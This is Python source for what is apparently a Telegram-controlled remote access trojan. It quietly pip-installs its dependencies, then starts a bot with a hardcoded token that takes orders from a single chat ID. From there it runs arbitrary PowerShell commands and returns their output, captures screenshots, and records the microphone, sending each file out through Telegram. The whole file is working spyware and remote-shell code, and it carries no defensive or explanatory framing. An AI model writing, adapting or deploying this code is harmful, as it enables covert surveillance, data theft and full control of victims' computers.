import sys
import subprocess
import logging
import os

def install_packages():
    packages = [
        "aiogram~=3.4.1",
        "requests~=2.31.0",
        "psutil~=5.9.7",
        "Pillow~=10.2.0",
        "opencv-python~=4.9.0.80",
        "PyAudio~=0.2.14",
        "pyperclip~=1.8.2",
    ]
    
    for package in packages:
        try:
            subprocess.check_call(
                [sys.executable, "-m", "pip", "install", "--quiet", package],
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL
            )
        except Exception as e:
            logging.error(f"An unexpected error occurred while installing {package}: {e}")
    
    for package in packages:
        try:
            subprocess.check_call(
                [sys.executable, "-m", "pip3", "install", "--quiet", package],
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL
            )
        except Exception as e:
            logging.error(f"An unexpected error occurred while installing {package}: {e}")

install_packages()


from aiogram.types import Message
from aiogram.filters.command import Command
from aiogram.fsm.state import StatesGroup, State
from aiogram.fsm.context import FSMContext
import asyncio
from aiogram.types import Message, FSInputFile
from aiogram import Dispatcher, types, Bot
from aiogram import Router
from PIL import ImageGrab
import pyaudio
import wave
from sys import platform
import warnings
warnings.filterwarnings("ignore", category=DeprecationWarning)

bot = Bot(token="8172078442:AAFvllCASC1XUCBHmyeC5o7sshWssVLlcDA", parse_mode="HTML")

dp = Dispatcher()
router: Router = Router()
dp.include_router(router)

class PowerShell(StatesGroup):
    PSOn = State()
    
@dp.errors()
async def errors_handler(update: types.Update, exception: Exception):
    logging.error(f'Error: {update}: {exception}')

@router.message(Command("start"))
async def cmd_start(message: Message):
    if message.chat.id != 7922074993:
        return
    commands = '''/start - start
/powershell - shell commands
/sc - screenshot
/mic 10 - microphone'''
    try:
        await message.answer(f'Hello @{message.from_user.username}')
        await message.answer(f'{commands}')
    except Exception as e:
        logging.error(e)

async def startPooling():
    try:
        await dp.start_polling(bot)
    except (KeyboardInterrupt, SystemExit):
        logging.info("Bot stopped")
    finally:
        await bot.session.close()

@router.message(Command("powershell"))
async def powershell_state(message: Message, state: FSMContext):
    try:
        await state.set_state(PowerShell.PSOn)
        await message.answer('<b>Powershell mode ON</b>\nSend <code>exit</code> to exit')
    except Exception as e:
        logging.error(e)

@router.message(PowerShell.PSOn)
async def cmd_powershell(message: Message, state: FSMContext):
    try:
        command = message.text.strip()

        # Retrieve current working directory from state; default to os.getcwd() if not set
        data = await state.get_data()
        current_dir = data.get("cwd", os.getcwd())

        # Handle the cd command separately
        if command.lower().startswith("cd"):
            # If the command is exactly "cd", return the current directory
            if command.lower() == "cd":
                await message.answer(f"Current directory: {current_dir}")
            else:
                # Get the target directory: remove the 'cd' part and strip whitespace
                new_path = command[2:].strip()
                # If new_path is relative, join it with the current directory
                if not os.path.isabs(new_path):
                    new_path = os.path.join(current_dir, new_path)
                # Normalize the path (resolve .. and .)
                new_path = os.path.abspath(new_path)
                # Check if the directory exists
                if os.path.isdir(new_path):
                    await state.update_data(cwd=new_path)
                    await message.answer(f"Directory changed to: {new_path}")
                else:
                    await message.answer(f"Directory not found: {new_path}")
            return

        # Exit command to leave PowerShell mode
        if command.lower() == 'exit':
            await state.clear()
            await message.answer("Exiting from PowerShell...\n<b>Powershell mode OFF</b>")
            return

        # Build the PowerShell command to run in the current working directory
        ps_command = ["powershell", "-Command", command]
        
        # Run the command and capture stdout and stderr, using the stored current directory
        process = subprocess.Popen(ps_command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, cwd=current_dir)
        stdout, stderr = process.communicate()

        # Combine output from both stdout and stderr
        output = ""
        if stdout:
            output += stdout.decode('utf-8', errors='ignore')
        if stderr:
            output += stderr.decode('utf-8', errors='ignore')

        # If there's output, split it into chunks to avoid message length limits.
        if output:
            part_size = 3900
            message_parts = [output[i:i + part_size] for i in range(0, len(output), part_size)]
            for part in message_parts:
                await message.answer(part, parse_mode=None)
        else:
            await message.answer("No output")

        # Remain in PowerShell mode
        await state.set_state(PowerShell.PSOn)
    except Exception as e:
        await message.answer(f"Error: {e}")

@router.message(Command("sc"))
async def cmd_sc(message: Message):
    try:
        # Parse counter argument from the command (e.g., "/sc 3 1")
        parts = message.text.split()
        count = int(parts[1]) if len(parts) > 1 else 1
        
        home_dir = os.path.expanduser('~')
        for i in range(count):
            path = os.path.join(home_dir, f'sc_{i+1}.jpg')
            
            sc = ImageGrab.grab(bbox=None)
            sc.save(path, quality=95)
            
            screen = FSInputFile(path)
            
            await message.answer_photo(screen, caption=f'Screenshot {i+1}')
            
            os.remove(path)
            
            if i < count - 1:
                await asyncio.sleep(int(parts[2]))
    except Exception as e:
        logging.error(f"An error occurred: {e}")


@router.message(Command("mic"))
async def cmd_mic(message: Message):
    try:
        if platform == "win32":
            path = os.path.expanduser('~') + r'\mic.wav'
        else:
            path = os.path.expanduser('~') + r'/mic.wav'
        args = message.text.split(' ')
        if len(args) == 2:
            audio_format = pyaudio.paInt16
            channels = 1
            rate = 44100
            chunk = 1024
            record_seconds = int(args[1])

            audio = pyaudio.PyAudio()
            stream = audio.open(format=audio_format, channels=channels, rate=rate, input=True, frames_per_buffer=chunk)
            frames = []

            for _ in range(0, int(rate / chunk * record_seconds)):
                data = stream.read(chunk)
                frames.append(data)

            stream.stop_stream()
            stream.close()
            audio.terminate()

            wave_file = wave.open(path, 'wb')
            wave_file.setnchannels(channels)
            wave_file.setsampwidth(audio.get_sample_size(audio_format))
            wave_file.setframerate(rate)
            wave_file.writeframes(b''.join(frames))
            wave_file.close()

            mic_file = FSInputFile(path)

            await message.answer_audio(mic_file)
        else:
            await message.answer(f"Usage: /mic 10\nSeconds int value")
    except Exception as e:
        logging.error(e)
        
def main():
    pathLog = os.path.expanduser('~') + '\\logs\\bot.log'
    logDirectory = os.path.dirname(pathLog)
    
    if not os.path.exists(logDirectory):
        os.makedirs(logDirectory)
        
    logging.basicConfig(level=logging.INFO, filename = pathLog,
                        format="%(filename)s:%(lineno)d #%(levelname)-8s" "[%(asctime)s] - %(name)s - %(message)s")
    logging.info('Bot starting...')
    try:
        asyncio.run(startPooling())
    except (KeyboardInterrupt, SystemExit):
        logging.info('Bot stopped by Ctrl + C')
        
if __name__ == "__main__":
    main()